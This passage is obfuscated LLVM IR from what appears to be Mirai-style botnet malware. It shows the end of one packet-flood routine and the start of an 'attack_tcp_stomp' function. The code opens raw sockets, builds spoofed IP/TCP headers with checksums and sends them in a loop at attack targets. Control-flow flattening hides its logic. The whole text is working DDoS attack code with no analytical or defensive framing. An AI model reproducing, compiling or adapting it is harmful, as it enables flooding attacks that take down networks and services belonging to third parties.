  store i16 %387, i16* %389, align 2
  store i32 -513452007, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %20, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -976560986, i32 -1417165391
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  store i32 %395, i32* %397, align 4
  store i32 -1417165391, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %21, align 4
  %400 = icmp eq i32 %399, 65535
  %401 = select i1 %400, i32 803832444, i32 922779263
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  store i32 %403, i32* %405, align 4
  store i32 922779263, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8, i8* %29, align 1
  %408 = icmp ne i8 %407, 0
  %409 = select i1 %408, i32 1754715335, i32 1724938875
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i8*, i8** %38, align 8
  %412 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %411, i32 %412)
  %413 = load i8*, i8** %38, align 8
  %414 = load i32, i32* %28, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds i8, i8* %413, i64 %415
  store i8 0, i8* %416, align 1
  store i32 1724938875, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 7
  store i16 0, i16* %419, align 2
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = bitcast %struct.iphdr* %420 to i16*
  %422 = call zeroext i16 @checksum_generic(i16* %421, i32 20)
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 %422, i16* %424, align 2
  %425 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 6
  store i16 0, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = bitcast %struct.tcphdr* %428 to i8*
  %430 = load i32, i32* %28, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 20, %431
  %433 = trunc i64 %432 to i16
  %434 = call zeroext i16 @htons(i16 zeroext %433) #7
  %435 = load i32, i32* %28, align 4
  %436 = sext i32 %435 to i64
  %437 = add i64 20, %436
  %438 = trunc i64 %437 to i32
  %439 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %427, i8* %429, i16 zeroext %434, i32 %438)
  %440 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 6
  store i16 %439, i16* %441, align 4
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 1
  %444 = load i16, i16* %443, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %446 = load i32, i32* %11, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 1
  store i16 %444, i16* %450, align 2
  %451 = load i32, i32* %12, align 4
  %452 = load i8*, i8** %35, align 8
  %453 = load i32, i32* %28, align 4
  %454 = sext i32 %453 to i64
  %455 = add i64 40, %454
  %456 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %457 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %458 = load i32, i32* %11, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i64 %459
  %461 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %460, i32 0, i32 0
  %462 = bitcast %struct.sockaddr_in* %461 to %struct.sockaddr*
  store %struct.sockaddr* %462, %struct.sockaddr** %456, align 8
  %463 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %464 = load %struct.sockaddr*, %struct.sockaddr** %463, align 8
  %465 = call i64 @sendto(i32 %451, i8* %452, i64 %455, i32 16384, %struct.sockaddr* %464, i32 16)
  store i32 969309119, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i32, i32* %11, align 4
  %468 = add nsw i32 %467, 1
  store i32 %468, i32* %11, align 4
  store i32 -816605449, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = call i64 @time(i64* null) #6
  %471 = load i32, i32* %31, align 4
  %472 = sext i32 %471 to i64
  %473 = icmp sgt i64 %470, %472
  %474 = select i1 %473, i32 1190730789, i32 127843219
  store i32 %474, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  store i32 -617781871, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  store i32 -1811546734, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %476, %475, %469, %466, %417, %410, %406, %402, %398, %394, %390, %384, %379, %373, %368, %362, %357, %353, %349, %328, %305, %299, %298, %297, %294, %287, %281, %186, %182, %134, %128, %127, %124, %118, %117, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -1493760045, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1493760045, label %first
    i32 1889998218, label %114
    i32 -2108304195, label %115
    i32 -2084119345, label %121
    i32 -601768092, label %124
    i32 -1650130981, label %125
    i32 -1585048029, label %131
    i32 -1081826921, label %132
    i32 844510768, label %136
    i32 859596256, label %137
    i32 -1340839739, label %153
    i32 -1952388260, label %174
    i32 -643943213, label %183
    i32 -1945845759, label %188
    i32 -216701574, label %193
    i32 1951063252, label %197
    i32 -505325339, label %205
    i32 -265152324, label %217
    i32 1470340974, label %218
    i32 617297854, label %227
    i32 -1998398082, label %232
    i32 -486815372, label %245
    i32 636518809, label %254
    i32 -1689276694, label %263
    i32 -482911132, label %355
    i32 1550468242, label %359
    i32 -1319617238, label %485
    i32 -292653103, label %494
    i32 559084569, label %503
    i32 1332816141, label %506
    i32 1843339481, label %507
    i32 -802613507, label %508
    i32 713181484, label %509
    i32 363882911, label %515
    i32 1264749460, label %518
    i32 1341872347, label %519
    i32 -1666677531, label %520
    i32 791769535, label %523
    i32 -1447345684, label %524
    i32 -1736780348, label %525
    i32 509670279, label %531
    i32 1074338117, label %549
    i32 -1725671454, label %555
    i32 1883782623, label %559
    i32 2105117675, label %566
    i32 -830693268, label %638
    i32 -1605276179, label %641
    i32 -245314430, label %647
    i32 779648956, label %648
    i32 1450885253, label %649
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %112 = icmp eq i32 %.reload, -1
  %113 = select i1 %112, i32 1889998218, i32 -2108304195
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 1450885253, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %116 = load i32, i32* %12, align 4
  %117 = bitcast i32* %11 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  %120 = select i1 %119, i32 -2084119345, i32 -601768092
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %12, align 4
  %123 = call i32 @close(i32 %122)
  store i32 1450885253, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1650130981, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %11, align 4
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %126, %128
  %130 = select i1 %129, i32 -1585048029, i32 791769535
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 -1081826921, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %133, i32* %29, align 4
  %134 = icmp eq i32 %133, -1
  %135 = select i1 %134, i32 844510768, i32 859596256
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  store i32 -1666677531, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %29, align 4
  %139 = load i32, i32* %29, align 4
  %140 = call i32 (i32, i32, ...) @fcntl(i32 %139, i32 3, i32 0)
  %141 = or i32 %140, 2048
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %138, i32 4, i32 %141)
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 2
  %149 = load i8, i8* %148, align 4
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %150, 32
  %152 = select i1 %151, i32 -1340839739, i32 -1952388260
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = call i32 @ntohl(i32 %159) #7
  %161 = call i32 @rand_next()
  %162 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 2
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  %169 = lshr i32 %161, %168
  %170 = add i32 %160, %169
  %171 = call i32 @htonl(i32 %170) #7
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  store i32 -643943213, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %176 = load i32, i32* %11, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 %180, i32* %182, align 4
  store i32 -643943213, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i16, i16* %19, align 2
  %185 = zext i16 %184 to i32
  %186 = icmp eq i32 %185, 65535
  %187 = select i1 %186, i32 -1945845759, i32 -216701574
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = call i32 @rand_next()
  %190 = and i32 %189, 65535
  %191 = trunc i32 %190 to i16
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %191, i16* %192, align 2
  store i32 1951063252, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i16, i16* %19, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %195, i16* %196, align 2
  store i32 1951063252, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i32, i32* %29, align 4
  %199 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %200 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %200, %struct.sockaddr** %199, align 8
  %201 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %202 = load %struct.sockaddr*, %struct.sockaddr** %201, align 8
  %203 = call i32 @connect(i32 %198, %struct.sockaddr* %202, i32 16)
  %204 = call i64 @time(i64* null) #6
  store i64 %204, i64* %34, align 8
  store i32 -505325339, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %206 = load i32, i32* %12, align 4
  %207 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %208 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %209 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %209, %struct.sockaddr** %208, align 8
  %210 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %211 = load %struct.sockaddr*, %struct.sockaddr** %210, align 8
  %212 = call i64 @recvfrom(i32 %206, i8* %207, i64 256, i32 16384, %struct.sockaddr* %211, i32* %32)
  %213 = trunc i64 %212 to i32
  store i32 %213, i32* %36, align 4
  %214 = load i32, i32* %36, align 4
  %215 = icmp eq i32 %214, -1
  %216 = select i1 %215, i32 -265152324, i32 1470340974
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 1450885253, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %220 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 4
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %223 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %221, %224
  %226 = select i1 %225, i32 617297854, i32 713181484
  store i32 %226, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %36, align 4
  %229 = sext i32 %228 to i64
  %230 = icmp ugt i64 %229, 40
  %231 = select i1 %230, i32 -1998398082, i32 713181484
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %234 = getelementptr inbounds i8, i8* %233, i64 20
  %235 = bitcast i8* %234 to %struct.tcphdr*
  store %struct.tcphdr* %235, %struct.tcphdr** %38, align 8
  %236 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = load i16, i16* %237, align 4
  %239 = zext i16 %238 to i32
  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %241 = load i16, i16* %240, align 2
  %242 = zext i16 %241 to i32
  %243 = icmp eq i32 %239, %242
  %244 = select i1 %243, i32 -486815372, i32 -802613507
  store i32 %244, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = lshr i16 %248, 9
  %250 = and i16 %249, 1
  %251 = zext i16 %250 to i32
  %252 = icmp ne i32 %251, 0
  %253 = select i1 %252, i32 636518809, i32 -1319617238
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = lshr i16 %257, 12
  %259 = and i16 %258, 1
  %260 = zext i16 %259 to i32
  %261 = icmp ne i32 %260, 0
  %262 = select i1 %261, i32 -1689276694, i32 -1319617238
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %265 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 4
  %267 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %268 = load i32, i32* %11, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %267, i64 %269
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %270, i32 0, i32 0
  store i32 %266, i32* %271, align 4
  %272 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 2
  %274 = load i32, i32* %273, align 4
  %275 = call i32 @ntohl(i32 %274) #7
  %276 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %279, i32 0, i32 1
  store i32 %275, i32* %280, align 4
  %281 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 3
  %283 = load i32, i32* %282, align 4
  %284 = call i32 @ntohl(i32 %283) #7
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 2
  store i32 %284, i32* %289, align 4
  %290 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 1
  %292 = load i16, i16* %291, align 2
  %293 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i32 0, i32 3
  store i16 %292, i16* %297, align 4
  %298 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %299 = load i16, i16* %298, align 2
  %300 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %303, i32 0, i32 4
  store i16 %299, i16* %304, align 2
  %305 = load i32, i32* %26, align 4
  %306 = sext i32 %305 to i64
  %307 = add i64 40, %306
  %308 = call noalias i8* @malloc(i64 %307) #6
  %309 = load i8**, i8*** %14, align 8
  %310 = load i32, i32* %11, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  store i8* %308, i8** %312, align 8
  %313 = load i8**, i8*** %14, align 8
  %314 = load i32, i32* %11, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i8*, i8** %313, i64 %315
  %317 = load i8*, i8** %316, align 8
  %318 = bitcast i8* %317 to %struct.iphdr*
  store %struct.iphdr* %318, %struct.iphdr** %39, align 8
  %319 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i64 1
  %321 = bitcast %struct.iphdr* %320 to %struct.tcphdr*
  store %struct.tcphdr* %321, %struct.tcphdr** %40, align 8
  %322 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i64 1
  %324 = bitcast %struct.tcphdr* %323 to i8*
  store i8* %324, i8** %41, align 8
  %325 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %326 = bitcast %struct.iphdr* %325 to i8*
  %327 = load i8, i8* %326, align 4
  %328 = and i8 %327, 15
  %329 = or i8 %328, 64
  store i8 %329, i8* %326, align 4
  %330 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %331 = bitcast %struct.iphdr* %330 to i8*
  %332 = load i8, i8* %331, align 4
  %333 = and i8 %332, -16
  %334 = or i8 %333, 5
  store i8 %334, i8* %331, align 4
  %335 = load i8, i8* %15, align 1
  %336 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 1
  store i8 %335, i8* %337, align 1
  %338 = load i32, i32* %26, align 4
  %339 = sext i32 %338 to i64
  %340 = add i64 40, %339
